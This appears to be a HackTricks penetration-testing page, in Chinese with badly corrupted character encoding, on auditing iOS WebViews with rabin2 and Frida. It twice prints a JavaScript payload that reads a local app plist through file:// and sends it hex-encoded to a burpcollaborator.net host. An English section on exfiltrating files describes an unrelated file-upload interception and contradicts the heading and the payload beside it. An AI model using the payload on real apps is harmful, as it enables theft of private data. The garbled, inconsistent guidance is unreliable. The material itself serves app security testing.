# iOS WebViews

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## WebViewsç±»å‹

WebViewsæ˜¯ç”¨äºæ˜¾ç¤ºäº¤äº’å¼**ç½‘é¡µå†…å®¹**çš„åº”ç”¨å†…æµè§ˆå™¨ç»„ä»¶ã€‚å®ƒä»¬å¯ä»¥ç”¨äºå°†ç½‘é¡µå†…å®¹ç›´æ¥åµŒå…¥åº”ç”¨çš„ç”¨æˆ·ç•Œé¢ä¸­ã€‚iOS WebViewsé»˜è®¤æ”¯æŒ**JavaScript**æ‰§è¡Œï¼Œå› æ­¤è„šæœ¬æ³¨å…¥å’Œè·¨ç«™è„šæœ¬æ”»å‡»å¯èƒ½ä¼šå½±å“å®ƒä»¬ã€‚

* [**UIWebView**](https://developer.apple.com/documentation/uikit/uiwebview)**ï¼š**UIWebViewä»iOS 12å¼€å§‹å·²è¢«å¼ƒç”¨ï¼Œä¸åº”å†ä½¿ç”¨ã€‚å®ƒä¸åº”è¯¥è¢«ä½¿ç”¨ã€‚**æ— æ³•ç¦ç”¨JavaScript**ã€‚
* [**WKWebView**](https://developer.apple.com/documentation/webkit/wkwebview)ï¼šè¿™æ˜¯æ‰©å±•åº”ç”¨åŠŸèƒ½ã€æ§åˆ¶æ˜¾ç¤ºå†…å®¹çš„é€‚å½“é€‰æ‹©ã€‚
* **JavaScript**é»˜è®¤å¯ç”¨ï¼Œä½†é€šè¿‡`WKWebView`çš„**`javaScriptEnabled`**å±æ€§ï¼Œå¯ä»¥**å®Œå…¨ç¦ç”¨**å®ƒï¼Œé˜²æ­¢æ‰€æœ‰è„šæœ¬æ³¨å…¥æ¼æ´ã€‚
* **`JavaScriptCanOpenWindowsAutomatically`**å¯ç”¨äº**é˜»æ­¢**JavaScript**æ‰“å¼€æ–°çª—å£**ï¼Œå¦‚å¼¹å‡ºçª—å£ã€‚
* **`hasOnlySecureContent`**å±æ€§å¯ç”¨äºéªŒè¯WebViewåŠ è½½çš„èµ„æºæ˜¯å¦é€šè¿‡åŠ å¯†è¿æ¥æ£€ç´¢ã€‚
* `WKWebView`å®ç°äº†**è¿›ç¨‹å¤–æ¸²æŸ“**ï¼Œå› æ­¤å†…å­˜æŸåæ¼æ´ä¸ä¼šå½±å“ä¸»åº”ç”¨ç¨‹åºè¿›ç¨‹ã€‚
* [**SFSafariViewController**](https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller)**ï¼š**å®ƒåº”è¯¥ç”¨äºæä¾›**é€šç”¨çš„ç½‘é¡µæµè§ˆä½“éªŒ**ã€‚è¿™äº›WebViewså¾ˆå®¹æ˜“è¢«è¯†åˆ«ï¼Œå› ä¸ºå®ƒä»¬å…·æœ‰ä»¥ä¸‹ç‰¹å¾å¸ƒå±€ï¼š

* ä¸€ä¸ªåªè¯»çš„åœ°å€æ ï¼Œå¸¦æœ‰å®‰å…¨æŒ‡ç¤ºå™¨ã€‚
* ä¸€ä¸ªæ“ä½œï¼ˆâ€œ**åˆ†äº«**â€ï¼‰**æŒ‰é’®**ã€‚
* ä¸€ä¸ª**å®ŒæˆæŒ‰é’®**ï¼Œå‰è¿›å’Œåé€€å¯¼èˆªæŒ‰é’®ï¼Œä»¥åŠä¸€ä¸ªâ€œSafariâ€æŒ‰é’®ï¼Œå¯ä»¥ç›´æ¥åœ¨Safariä¸­æ‰“å¼€é¡µé¢ã€‚

<img src="https://gblobscdn.gitbook.com/assets%2F-LH00RC4WVf3-6Ou4e0l%2F-Lf1APQHyCHdAvoJSvc_%2F-Lf1AQxr7FPsOyPFSGcs%2Fsfsafariviewcontroller.png?alt=media" alt="" data-size="original">

* åœ¨`SFSafariViewController`ä¸­**æ— æ³•ç¦ç”¨JavaScript**ï¼Œè¿™ä¹Ÿæ˜¯æ¨èåœ¨æ‰©å±•åº”ç”¨ç¨‹åºç”¨æˆ·ç•Œé¢æ—¶ä½¿ç”¨`WKWebView`çš„åŸå› ä¹‹ä¸€ã€‚
* `SFSafariViewController`è¿˜ä¸**Safariå…±äº«cookie**å’Œå…¶ä»–ç½‘ç«™æ•°æ®ã€‚
* ç”¨æˆ·åœ¨`SFSafariViewController`ä¸­çš„æ´»åŠ¨å’Œäº¤äº’å¯¹åº”ç”¨ç¨‹åº**ä¸å¯è§**ï¼Œåº”ç”¨ç¨‹åºæ— æ³•è®¿é—®è‡ªåŠ¨å¡«å……æ•°æ®ã€æµè§ˆå†å²è®°å½•æˆ–ç½‘ç«™æ•°æ®ã€‚
* æ ¹æ®App Storeå®¡æ ¸æŒ‡å—ï¼Œ`SFSafariViewController`**ä¸å¾—è¢«å…¶ä»–è§†å›¾æˆ–å›¾å±‚éšè—æˆ–é®æŒ¡**ã€‚

## å‘ç°WebViewsé…ç½®

### é™æ€åˆ†æ

**UIWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
489 0x0002fee9 0x10002fee9   9  10 (5.__TEXT.__cstring) ascii UIWebView
896 0x0003c813 0x0003c813  24  25 () ascii @_OBJC_CLASS_$_UIWebView
1754 0x00059599 0x00059599  23  24 () ascii _OBJC_CLASS_$_UIWebView
```
**WKWebView**

WKWebViewæ˜¯iOSä¸­çš„ä¸€ä¸ªå¼ºå¤§çš„Webæµè§ˆå™¨æ§ä»¶ï¼Œå®ƒæä¾›äº†æ›´å¥½çš„æ€§èƒ½å’ŒåŠŸèƒ½ï¼Œç›¸æ¯”äºæ—§ç‰ˆçš„UIWebViewã€‚å®ƒæ˜¯åŸºäºWebKitå¼•æ“æ„å»ºçš„ï¼Œæ”¯æŒç°ä»£çš„Webæ ‡å‡†å’ŒæŠ€æœ¯ã€‚

WKWebViewåœ¨iOSåº”ç”¨ç¨‹åºä¸­å¹¿æ³›ä½¿ç”¨ï¼Œç‰¹åˆ«æ˜¯åœ¨é›†æˆWebå†…å®¹å’ŒåŠŸèƒ½çš„åº”ç”¨ç¨‹åºä¸­ã€‚å®ƒå¯ä»¥åŠ è½½å’Œæ˜¾ç¤ºç½‘é¡µã€å¤„ç†JavaScriptäº¤äº’ã€å¤„ç†ç½‘é¡µå¯¼èˆªå’ŒåŠ è½½é”™è¯¯ç­‰ã€‚

åœ¨è¿›è¡ŒiOSåº”ç”¨ç¨‹åºçš„æ¸—é€æµ‹è¯•æ—¶ï¼Œäº†è§£WKWebViewçš„å®‰å…¨æ€§å’Œæ½œåœ¨çš„æ¼æ´æ˜¯å¾ˆé‡è¦çš„ã€‚æ”»å‡»è€…å¯èƒ½åˆ©ç”¨WKWebViewä¸­çš„æ¼æ´æ¥æ‰§è¡Œæ¶æ„ä»£ç ã€çªƒå–ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æˆ–è€…è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ã€‚

å› æ­¤ï¼Œå¯¹äºiOSæ¸—é€æµ‹è¯•äººå‘˜æ¥è¯´ï¼Œç†Ÿæ‚‰WKWebViewçš„å·¥ä½œåŸç†ã€å®‰å…¨é…ç½®å’Œå¯èƒ½çš„æ”»å‡»é¢æ˜¯è‡³å…³é‡è¦çš„ã€‚è¿™å°†å¸®åŠ©ä»–ä»¬å‘ç°å’Œåˆ©ç”¨æ½œåœ¨çš„æ¼æ´ï¼Œä»¥æé«˜åº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§ã€‚
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
490 0x0002fef3 0x10002fef3   9  10 (5.__TEXT.__cstring) ascii WKWebView
625 0x00031670 0x100031670  17  18 (5.__TEXT.__cstring) ascii unwindToWKWebView
904 0x0003c960 0x0003c960  24  25 () ascii @_OBJC_CLASS_$_WKWebView
1757 0x000595e4 0x000595e4  23  24 () ascii _OBJC_CLASS_$_WKWebView
```
æˆ–è€…ï¼Œæ‚¨è¿˜å¯ä»¥æœç´¢è¿™äº›WebViewç±»çš„å·²çŸ¥æ–¹æ³•ã€‚ä¾‹å¦‚ï¼Œæœç´¢ç”¨äºåˆå§‹åŒ–WKWebViewçš„æ–¹æ³•ï¼ˆ[`init(frame:configuration:)`](https://developer.apple.com/documentation/webkit/wkwebview/1414998-init)ï¼‰ï¼š
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
0x5c3ac 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x5d97a 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
0x6b5d5 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x6c3fa 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
```
#### æµ‹è¯•JavaScripté…ç½®

å¯¹äº`WKWebView`ï¼Œæœ€ä½³å®è·µæ˜¯é™¤éæ˜ç¡®éœ€è¦ï¼Œå¦åˆ™åº”ç¦ç”¨JavaScriptã€‚ä¸ºäº†éªŒè¯JavaScriptæ˜¯å¦è¢«æ­£ç¡®ç¦ç”¨ï¼Œè¯·æœç´¢é¡¹ç›®ä¸­æ˜¯å¦ä½¿ç”¨äº†`WKPreferences`ï¼Œå¹¶ç¡®ä¿[`javaScriptEnabled`](https://developer.apple.com/documentation/webkit/wkpreferences/1536203-javascriptenabled)å±æ€§è¢«è®¾ç½®ä¸º`false`ï¼š
```
let webPreferences = WKPreferences()
webPreferences.javaScriptEnabled = false
```
å¦‚æœåªæœ‰ç¼–è¯‘åçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½ å¯ä»¥åœ¨å…¶ä¸­æœç´¢ä»¥ä¸‹å†…å®¹ï¼š
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
391 0x0002f2c7 0x10002f2c7  17  18 (4.__TEXT.__objc_methname) ascii javaScriptEnabled
392 0x0002f2d9 0x10002f2d9  21  22 (4.__TEXT.__objc_methname) ascii setJavaScriptEnabled
```
#### ä»…æµ‹è¯•OnlySecureContent

ä¸`UIWebView`ä¸åŒï¼Œä½¿ç”¨`WKWebView`æ—¶å¯ä»¥æ£€æµ‹åˆ°[æ··åˆå†…å®¹](https://developers.google.com/web/fundamentals/security/prevent-mixed-content/fixing-mixed-content?hl=en)ï¼ˆä»HTTPSé¡µé¢åŠ è½½çš„HTTPå†…å®¹ï¼‰ã€‚é€šè¿‡ä½¿ç”¨[`hasOnlySecureContent`](https://developer.apple.com/documentation/webkit/wkwebview/1415002-hasonlysecurecontent)æ–¹æ³•ï¼Œå¯ä»¥éªŒè¯é¡µé¢ä¸Šçš„æ‰€æœ‰èµ„æºæ˜¯å¦é€šè¿‡å®‰å…¨åŠ å¯†è¿æ¥åŠ è½½ã€‚\
åœ¨ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼š
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
æ‚¨è¿˜å¯ä»¥åœ¨æºä»£ç æˆ–å­—ç¬¦ä¸²ä¸­æœç´¢å­—ç¬¦ä¸²"http://"ã€‚ç„¶è€Œï¼Œè¿™å¹¶ä¸ä¸€å®šæ„å‘³ç€å­˜åœ¨æ··åˆå†…å®¹é—®é¢˜ã€‚äº†è§£æœ‰å…³æ··åˆå†…å®¹çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…[MDN Webæ–‡æ¡£](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed\_content)ã€‚

### åŠ¨æ€åˆ†æ

å¯ä»¥é€šè¿‡`ObjC.choose()`æ¥æ£€æŸ¥å †ï¼Œä»¥æŸ¥æ‰¾ä¸åŒç±»å‹çš„WebViewå®ä¾‹ï¼Œå¹¶æœç´¢å±æ€§`javaScriptEnabled`å’Œ`hasonlysecurecontent`ï¼š

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åŠ è½½ï¼š
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>

hasOnlySecureContent:  false
```
## WebViewåè®®å¤„ç†

åœ¨iOSä¸Šçš„WebViewä¸­ï¼Œæœ‰å‡ ä¸ªé»˜è®¤çš„schemeå¯ä»¥è§£é‡Šï¼Œä¾‹å¦‚ï¼š

* http(s)://
* file://
* tel://

WebViewå¯ä»¥ä»ç«¯ç‚¹åŠ è½½è¿œç¨‹å†…å®¹ï¼Œä¹Ÿå¯ä»¥ä»åº”ç”¨æ•°æ®ç›®å½•åŠ è½½æœ¬åœ°å†…å®¹ã€‚å¦‚æœåŠ è½½æœ¬åœ°å†…å®¹ï¼Œåˆ™ç”¨æˆ·ä¸åº”è¯¥èƒ½å¤Ÿå½±å“åŠ è½½æ–‡ä»¶çš„æ–‡ä»¶åæˆ–è·¯å¾„ï¼Œå¹¶ä¸”ç”¨æˆ·ä¸åº”è¯¥èƒ½å¤Ÿç¼–è¾‘åŠ è½½çš„æ–‡ä»¶ã€‚

### WebViewå†…å®¹åŠ è½½

* **UIWebView**ï¼šå®ƒå¯ä»¥ä½¿ç”¨å·²å¼ƒç”¨çš„æ–¹æ³•[`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617979-loadhtmlstring?language=objc)æˆ–[`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617941-loaddata?language=objc)æ¥åŠ è½½å†…å®¹ã€‚
* **WKWebView**ï¼šå®ƒå¯ä»¥ä½¿ç”¨æ–¹æ³•[`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415004-loadhtmlstring?language=objc)æˆ–[`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415011-loaddata?language=objc)æ¥åŠ è½½æœ¬åœ°HTMLæ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨`loadRequest:`åŠ è½½Webå†…å®¹ã€‚é€šå¸¸ï¼Œæœ¬åœ°æ–‡ä»¶ä¸å…¶ä»–æ–¹æ³•ä¸€èµ·åŠ è½½ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºï¼š[`pathForResource:ofType:`](https://developer.apple.com/documentation/foundation/nsbundle/1410989-pathforresource)ã€[`URLForResource:withExtension:`](https://developer.apple.com/documentation/foundation/nsbundle/1411540-urlforresource?language=objc)æˆ–[`init(contentsOf:encoding:)`](https://developer.apple.com/documentation/swift/string/3126736-init)ã€‚æ­¤å¤–ï¼Œæ‚¨è¿˜åº”è¯¥éªŒè¯åº”ç”¨æ˜¯å¦ä½¿ç”¨äº†æ–¹æ³•[`loadFileURL:allowingReadAccessToURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1414973-loadfileurl?language=objc)ã€‚å®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯`URL`ï¼ŒåŒ…å«è¦åœ¨WebViewä¸­åŠ è½½çš„URLï¼Œç¬¬äºŒä¸ªå‚æ•°`allowingReadAccessToURL`å¯ä»¥åŒ…å«ä¸€ä¸ªå•ä¸ªæ–‡ä»¶æˆ–ä¸€ä¸ªç›®å½•ã€‚å¦‚æœåŒ…å«ä¸€ä¸ªå•ä¸ªæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å°†å¯ä¾›WebViewä½¿ç”¨ã€‚ä½†æ˜¯ï¼Œå¦‚æœå®ƒåŒ…å«ä¸€ä¸ªç›®å½•ï¼Œåˆ™è¯¥ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶éƒ½å°†å¯¹WebViewå¯ç”¨ã€‚å› æ­¤ï¼Œå€¼å¾—æ£€æŸ¥è¿™ä¸€ç‚¹ï¼Œå¹¶åœ¨å®ƒæ˜¯ä¸€ä¸ªç›®å½•çš„æƒ…å†µä¸‹ï¼ŒéªŒè¯å…¶ä¸­æ˜¯å¦æ²¡æœ‰æ•æ„Ÿæ•°æ®ã€‚

å¦‚æœæ‚¨æœ‰æºä»£ç ï¼Œå¯ä»¥æœç´¢è¿™äº›æ–¹æ³•ã€‚å¦‚æœæ‚¨æœ‰**å·²ç¼–è¯‘çš„** **äºŒè¿›åˆ¶æ–‡ä»¶**ï¼Œä¹Ÿå¯ä»¥æœç´¢è¿™äº›æ–¹æ³•ï¼š
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
### æ–‡ä»¶è®¿é—®

* **UIWebView:**
* `file://` æ–¹æ¡ˆå§‹ç»ˆå¯ç”¨ã€‚
* ä» `file://` URL è®¿é—®æ–‡ä»¶å§‹ç»ˆå¯ç”¨ã€‚
* ä» `file://` URL å®ç°çš„é€šç”¨è®¿é—®å§‹ç»ˆå¯ç”¨ã€‚
* å¦‚æœæ‚¨ä» `baseURL` ä¹Ÿè®¾ç½®ä¸º `nil` çš„ `UIWebView` ä¸­æ£€ç´¢æœ‰æ•ˆæ¥æºï¼Œæ‚¨å°†çœ‹åˆ°å®ƒ**ä¸æ˜¯è®¾ç½®ä¸º "null"**ï¼Œè€Œæ˜¯ç±»ä¼¼äºä»¥ä¸‹å†…å®¹ï¼š`applewebdata://5361016c-f4a0-4305-816b-65411fc1d78`0ã€‚è¿™ä¸ªæ¥æº "applewebdata://" ç±»ä¼¼äº "file://" æ¥æºï¼Œå› ä¸ºå®ƒ**ä¸å®ç°åŒæºç­–ç•¥**ï¼Œå…è®¸è®¿é—®æœ¬åœ°æ–‡ä»¶å’Œä»»ä½•ç½‘ç»œèµ„æºã€‚

{% tabs %}
{% tab title="exfiltrate_file" %}
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
{% endtab %}
{% endtabs %}

* **WKWebView**:
* **`allowFileAccessFromFileURLs`** (`WKPreferences`, é»˜è®¤ä¸º`false`): å®ƒå…è®¸åœ¨`file://`æ–¹æ¡ˆURLçš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œçš„JavaScriptè®¿é—®å…¶ä»–`file://`æ–¹æ¡ˆURLçš„å†…å®¹ã€‚
* **`allowUniversalAccessFromFileURLs`** (`WKWebViewConfiguration`, é»˜è®¤ä¸º`false`): å®ƒå…è®¸åœ¨`file://`æ–¹æ¡ˆURLçš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œçš„JavaScriptè®¿é—®ä»»ä½•æ¥æºçš„å†…å®¹ã€‚

æ‚¨å¯ä»¥åœ¨åº”ç”¨ç¨‹åºçš„æºä»£ç æˆ–ç¼–è¯‘åçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æœç´¢è¿™äº›å‡½æ•°ã€‚\
æ­¤å¤–ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹fridaè„šæœ¬æŸ¥æ‰¾è¿™äº›ä¿¡æ¯ï¼š
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```

```bash
frida -U -f com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>
URL:  file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/
Library/WKWebView/scenario1.html
javaScriptEnabled:  true
allowFileAccessFromFileURLs:  0
hasOnlySecureContent:  false
allowUniversalAccessFromFileURLs:  0
```
#### æ³„éœ²ä»»æ„æ–‡ä»¶

To exfiltrate arbitrary files from an iOS app's webview, you can use the following steps:

1. Identify the webview's file upload functionality: Look for any file upload feature within the webview, such as a file input field or a file upload button.

2. Craft a malicious file: Create a file with malicious content that you want to exfiltrate from the app. This file can be a text file, an image, or any other file type supported by the webview's file upload functionality.

3. Intercept the file upload request: Use a proxy tool like Burp Suite to intercept the file upload request sent by the app. Modify the request to include your malicious file instead of the intended file.

4. Capture the request details: Take note of the request headers, parameters, and any other relevant information that will help you replicate the request later.

5. Send the modified request: Forward the modified request to the server and observe the response. If successful, the server will receive the malicious file instead of the intended file.

By exploiting the file upload functionality in an iOS app's webview, you can exfiltrate arbitrary files and potentially gain access to sensitive information. It is important to note that this technique may be illegal and should only be performed with proper authorization during a legitimate penetration testing engagement.
```javascript
//For some reason this payload doesn't work!!
//Let me know if you know how to exfiltrate local files from a WKWebView
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## é€šè¿‡WebViewsæš´éœ²çš„æœ¬åœ°æ–¹æ³•

è‡ªiOS 7ä»¥æ¥ï¼Œè‹¹æœå¼•å…¥äº†ä¸€äº›APIï¼Œå…è®¸**WebViewä¸­çš„JavaScriptè¿è¡Œæ—¶ä¸æœ¬åœ°çš„Swiftæˆ–Objective-Cå¯¹è±¡è¿›è¡Œé€šä¿¡**ã€‚

æœ¬åœ°ä»£ç å’ŒJavaScriptä¹‹é—´æœ‰ä¸¤ç§åŸºæœ¬çš„é€šä¿¡æ–¹å¼ï¼š

* **JSContext**ï¼šå½“å°†Objective-Cæˆ–Swiftå—åˆ†é…ç»™`JSContext`ä¸­çš„æ ‡è¯†ç¬¦æ—¶ï¼ŒJavaScriptCoreä¼šè‡ªåŠ¨å°†è¯¥å—å°è£…åœ¨JavaScriptå‡½æ•°ä¸­ã€‚
* **JSExportåè®®**ï¼šåœ¨`JSExport`ç»§æ‰¿çš„åè®®ä¸­å£°æ˜çš„å±æ€§ã€å®ä¾‹æ–¹æ³•å’Œç±»æ–¹æ³•è¢«æ˜ å°„åˆ°JavaScriptå¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡å¯¹æ‰€æœ‰JavaScriptä»£ç éƒ½å¯ç”¨ã€‚å¯¹äºåœ¨JavaScriptç¯å¢ƒä¸­çš„å¯¹è±¡çš„ä¿®æ”¹ä¼šåæ˜ åœ¨æœ¬åœ°ç¯å¢ƒä¸­ã€‚

è¯·æ³¨æ„ï¼Œ**åªæœ‰åœ¨`JSExport`åè®®ä¸­å®šä¹‰çš„ç±»æˆå‘˜**æ‰å¯ä»¥è¢«JavaScriptä»£ç è®¿é—®ã€‚\
è¯·æ³¨æ„æŸ¥æ‰¾å°†æœ¬åœ°å¯¹è±¡æ˜ å°„åˆ°ä¸WebViewå…³è”çš„`JSContext`çš„ä»£ç ï¼Œå¹¶åˆ†æå®ƒæ‰€å…¬å¼€çš„åŠŸèƒ½ï¼Œä¾‹å¦‚ä¸åº”è¯¥å°†æ•æ„Ÿæ•°æ®æš´éœ²ç»™WebViewsã€‚\
åœ¨Objective-Cä¸­ï¼Œè·å–ä¸`UIWebView`å…³è”çš„`JSContext`çš„æ–¹æ³•å¦‚ä¸‹ï¼š
```objectivec
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
åœ¨ **`WKWebView` ä¸­ï¼ŒJavaScript ä»£ç ä»ç„¶å¯ä»¥å‘æœ¬æœºåº”ç”¨ç¨‹åºå‘é€æ¶ˆæ¯ï¼Œä½†ä¸ `UIWebView` ä¸åŒçš„æ˜¯ï¼Œæ— æ³•ç›´æ¥å¼•ç”¨ `WKWebView` çš„ `JSContext`**ã€‚ç›¸åï¼Œä½¿ç”¨æ¶ˆæ¯ç³»ç»Ÿå’Œ `postMessage` å‡½æ•°æ¥å®ç°é€šä¿¡ï¼Œè¯¥å‡½æ•°ä¼šè‡ªåŠ¨å°† JavaScript å¯¹è±¡åºåˆ—åŒ–ä¸ºæœ¬æœºçš„ Objective-C æˆ– Swift å¯¹è±¡ã€‚å¯ä»¥ä½¿ç”¨æ–¹æ³• [`add(_ scriptMessageHandler:name:)`](https://developer.apple.com/documentation/webkit/wkusercontentcontroller/1537172-add) æ¥é…ç½®æ¶ˆæ¯å¤„ç†ç¨‹åºã€‚

### å¯ç”¨ JavascriptBridge
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### å‘é€æ¶ˆæ¯

